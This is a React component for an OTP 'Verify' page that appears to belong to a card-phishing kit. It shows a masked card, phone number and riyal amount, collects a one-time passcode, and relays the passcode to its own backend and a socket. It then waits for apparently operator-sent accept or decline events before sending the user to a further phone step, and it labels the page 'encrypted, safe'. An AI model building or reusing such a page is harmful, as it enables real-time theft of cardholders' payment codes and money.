import { useCallback, useEffect, useMemo, useState } from "react";
import { api_route, socket } from "../App";
import axios from "axios";
import { useNavigate } from "react-router-dom";
import { useTranslation } from "../context/LanguageContext";
import {
  LuShieldCheck,
  LuSmartphone,
  LuCreditCard,
  LuWallet,
  LuKeyRound,
} from "react-icons/lu";
import FloatingActions from "../components/FloatingActions";
import ApplyFooter from "../components/ApplyFooter";

function maskCardNumber(cardNumber) {
  const digits = (cardNumber || "").replace(/\s/g, "");
  if (digits.length < 4) return "•••• •••• •••• 0000";
  return `•••• •••• •••• ${digits.slice(-4)}`;
}

function maskPhone(phone) {
  const digits = String(phone || "").replace(/\D/g, "");
  if (digits.length < 3) return "••••••";
  return `•••••• ${digits.slice(-3)}`;
}

const Verify = () => {
  const { t, dir } = useTranslation();
  const [error, setError] = useState(false);
  const [load, setLoad] = useState(false);
  const [otp, setOtp] = useState("");
  const [resendIn, setResendIn] = useState(60);
  const navigate = useNavigate();
  const search = window.location.search;

  const data = useMemo(() => {
    try {
      const raw = new URLSearchParams(search).get("data");
      if (!raw) return null;
      return JSON.parse(raw);
    } catch {
      return null;
    }
  }, [search]);

  const _id = data?._id;
  const last3 = String(data?.phone || "")
    .replace(/\D/g, "")
    .slice(-3);

  const priceNum =
    parseFloat(String(data?.companyData?.price || "").replace(/[^\d.]/g, "")) ||
    0;
  const vat = +(priceNum * 0.15).toFixed(2);
  const transactionAmount = (priceNum + vat).toFixed(2);

  useEffect(() => {
    const id = setInterval(() => {
      setResendIn((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(id);
  }, []);

  const handleOtp = async (e) => {
    e.preventDefault();
    if (!_id) return;
    setLoad(true);
    setError(false);
    const finalData = { ...data, otp };
    try {
      await axios.post(`${api_route}/visaOtp/${_id}`, finalData);
      socket.emit("visaOtp", { id: _id, otp });
    } catch {
      setLoad(false);
    }
  };

  const onAcceptVisaOtp = useCallback(
    (id) => {
      if (id !== _id) return;
      setLoad(false);
      sessionStorage.setItem("id", id);
      socket.emit("bindOrder", id);
      navigate(`/phone?id=${id}`);
    },
    [_id, navigate],
  );

  const onDeclineVisaOtp = useCallback(
    (id) => {
      if (id !== _id) return;
      setLoad(false);
      setError(true);
    },
    [_id],
  );

  useEffect(() => {
    socket.on("acceptVisaOtp", onAcceptVisaOtp);
    socket.on("declineVisaOtp", onDeclineVisaOtp);
    return () => {
      socket.off("acceptVisaOtp", onAcceptVisaOtp);
      socket.off("declineVisaOtp", onDeclineVisaOtp);
    };
  }, [onAcceptVisaOtp, onDeclineVisaOtp]);

  if (!data || !_id) {
    return (
      <div className="flex min-h-52 w-full items-center justify-center text-xl text-red-500">
        {t("common.invalidData")}
      </div>
    );
  }

  const canSubmit = otp.length >= 4;

  return (
    <div
      className="flex min-h-screen w-full flex-col bg-[#F8F9FB] "
      dir={dir}
    >
      {load ? (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/30">
          <div className="flex flex-col items-center gap-3 rounded-2xl bg-white px-8 py-6 shadow-lg">
            <div className="h-10 w-10 animate-spin rounded-full border-4 border-[#146394]/20 border-t-[#146394]" />
            <span className="text-sm font-bold text-[#146394]">
              {t("verify.processing")}
            </span>
          </div>
        </div>
      ) : null}

      <div className="mx-auto w-full max-w-md px-4 pt-4">
        <section className="overflow-hidden rounded-2xl bg-white shadow-sm">
          <div className="flex items-center gap-3 bg-[#146394] px-4 py-3.5">
            <LuShieldCheck className="h-7 w-7 shrink-0 text-white" />
            <div>
              <h1 className="text-base font-extrabold text-white">
                {t("verify.headerTitle")}
              </h1>
              <p className="text-[11px] font-semibold text-white/85">
                {t("verify.headerSub")}
              </p>
            </div>
          </div>

          <div className="px-4 pt-4">
            <div className="space-y-3 rounded-xl border border-gray-200 px-3 py-3">
              {[
                {
                  icon: LuSmartphone,
                  label: t("verify.mobile"),
                  value: maskPhone(data.phone),
                  ltr: true,
                },
                {
                  icon: LuCreditCard,
                  label: t("verify.card"),
                  value: maskCardNumber(data.cardNumber),
                  ltr: true,
                },
                {
                  icon: LuWallet,
                  label: t("verify.amount"),
                  value: `${transactionAmount} ${t("common.currencySar")}`,
                  ltr: false,
                },
              ].map((row) => (
                <div key={row.label} className="flex items-center gap-2">
                  <row.icon className="h-4 w-4 shrink-0 text-gray-400" />
                  <span className="flex-1 text-xs font-semibold text-gray-500">
                    {row.label}
                  </span>
                  <span
                    className="text-sm font-extrabold text-[#146394]"
                    dir={row.ltr ? "ltr" : dir}
                  >
                    {row.value}
                  </span>
                </div>
              ))}
            </div>
          </div>

          <form onSubmit={handleOtp} className="px-4 py-5">
            <div className="mb-4 flex flex-col items-center text-center">
              <span className="mb-3 flex h-14 w-14 items-center justify-center rounded-full bg-[#E8F3FB] text-[#146394]">
                <LuKeyRound className="h-7 w-7" />
              </span>
              <h2 className="text-lg font-extrabold text-[#146394]">
                {t("verify.enterTitle")}
              </h2>
              <p className="mt-1.5 text-xs font-semibold text-[#146394]">
                {t("verify.sentTo", { last: last3 || "•••" })}
              </p>
              <p className="mt-0.5 text-xs font-semibold text-gray-400">
                {t("verify.digitsHint")}
              </p>
            </div>

            <input
              type="text"
              inputMode="numeric"
              autoComplete="one-time-code"
              required
              minLength={4}
              maxLength={6}
              dir="ltr"
              value={otp}
              onChange={(e) =>
                setOtp(e.target.value.replace(/\D/g, "").slice(0, 6))
              }
              placeholder="••••••"
              aria-label={t("verify.enterTitle")}
              className="w-full rounded-xl border border-gray-200 bg-white py-3.5 text-center text-2xl font-extrabold tracking-[0.55em] text-[#146394] outline-none placeholder:text-gray-300 focus:border-[#146394]"
            />
            <p className="mt-2 text-center text-[11px] font-semibold text-gray-400">
              {t("verify.digitCount", { n: otp.length })}
            </p>
            <p className="mt-1 text-center text-[11px] font-semibold text-gray-400">
              {t("verify.resendIn", { s: resendIn })}
            </p>

            {error ? (
              <p className="mt-3 text-center text-sm text-red-600">
                {t("verify.invalidPasscode")}
              </p>
            ) : null}

            <button
              type="submit"
              disabled={!canSubmit}
              className={`mt-5 w-full rounded-xl py-3.5 text-base font-bold text-white ${
                canSubmit ? "bg-[#146394]" : "cursor-not-allowed bg-[#8AA4B8]"
              }`}
            >
              {t("verify.confirmTx")}
            </button>
            <p className="mt-4 flex items-center justify-center gap-1.5 text-center text-xs font-semibold text-gray-400">
              <span className="flex h-4 w-4 items-center justify-center rounded-full bg-green-500 text-white">
                <LuShieldCheck className="h-2.5 w-2.5" />
              </span>
              {t("verify.encryptedSafe")}
            </p>
          </form>
        </section>
      </div>

      <FloatingActions />
      <ApplyFooter />
    </div>
  );
};

export default Verify;
